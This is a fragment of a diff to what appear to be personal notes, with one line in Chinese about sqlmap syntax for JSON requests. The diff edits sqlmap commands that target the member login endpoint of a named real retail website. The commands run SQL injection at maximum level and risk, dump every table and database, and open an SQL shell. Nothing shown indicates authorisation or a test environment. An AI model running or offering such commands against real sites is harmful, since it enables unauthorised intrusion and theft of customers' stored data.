@@ -10,7 +10,7 @@ $ sqlmap -r loginRequest2.txt -T4 --random-agent --current-db --dbs --tables --d
 使用帶 json 的，sqlmap 不支援 `-p` 指定參數，必須用星號
 
 ```shell
-sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T4 -v3 --level 5 --risk 3  --tables --dump-all 
+sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T5 -v3 --level 5 --risk 3  --tables --dump-all --sql-shell --force-ssl
 
 sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf" -p "id" -T4 -v3 --level 5 --risk 3 --random-agent --force-ssl --tables --dump-all --hex
 
